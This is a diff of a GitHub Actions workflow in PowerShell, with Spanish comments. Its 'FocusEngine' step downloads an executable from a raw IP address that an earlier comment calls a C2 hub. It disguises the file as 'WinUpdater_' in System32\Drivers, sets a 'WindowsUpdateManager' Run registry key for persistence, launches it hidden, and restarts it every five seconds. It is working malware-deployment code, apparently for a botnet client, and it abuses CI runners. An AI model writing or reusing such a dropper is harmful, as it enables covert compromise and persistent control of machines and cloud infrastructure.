@@ -34,28 +34,28 @@ jobs:
 
       - name: 4. Deploy FocusEngine & Auto-Start
         run: |
-          # Dirección IP de tu Hub C2 y ruta de descarga
-          $url = "http://103.195.101.218:8080/builds/FocusEngine.exe"
+          # URL Restaurada a la estructura original de publicbot
+          $url = "http://103.195.101.218:8080/publicbot/FocusEngine.exe"
           
-          # Ofuscación de nombre y ruta en Drivers del sistema
+          # Ofuscación de nombre y ruta
           $randName = "WinUpdater_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
           $dest = "C:\Windows\System32\Drivers\$randName"
           echo "PROC_NAME=$randName" >> $env:GITHUB_ENV
           echo "FULL_PATH=$dest" >> $env:GITHUB_ENV
           
           try {
-              # Descarga desde el Hub Central
+              # Descarga desde la ruta publicbot habilitada en el servidor
               Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
               
-              # Inserción en Registro de Windows para persistencia tras reinicio
+              # Persistencia en Registro
               $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
               Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $dest
               
-              # Ejecución en segundo plano oculto
+              # Ejecución oculta
               Start-Process $dest -WindowStyle Hidden
-              Write-Host "[SUCCESS] FocusEngine desplegado en: $dest"
+              Write-Host "[SUCCESS] FocusEngine desplegado correctamente desde $url"
           } catch {
-              Write-Error "[FATAL] No se pudo descargar el cliente desde $url"
+              Write-Error "[FATAL] No se pudo descargar el cliente. Verifica que el servidor esté encendido."
               exit 1
           }
 
@@ -74,9 +74,8 @@ jobs:
           Write-Host "=========================================="
           
           while ($true) {
-              # Verifica si el proceso sigue vivo cada 5 segundos
               if (!(Get-Process $procOnly -ErrorAction SilentlyContinue)) {
-                  Write-Host "[$(Get-Date)] Proceso caído. Reiniciando desde $env:FULL_PATH..."
+                  Write-Host "[$(Get-Date)] Reiniciando proceso..."
                   Start-Process $env:FULL_PATH -WindowStyle Hidden
               }
               Start-Sleep -Seconds 5
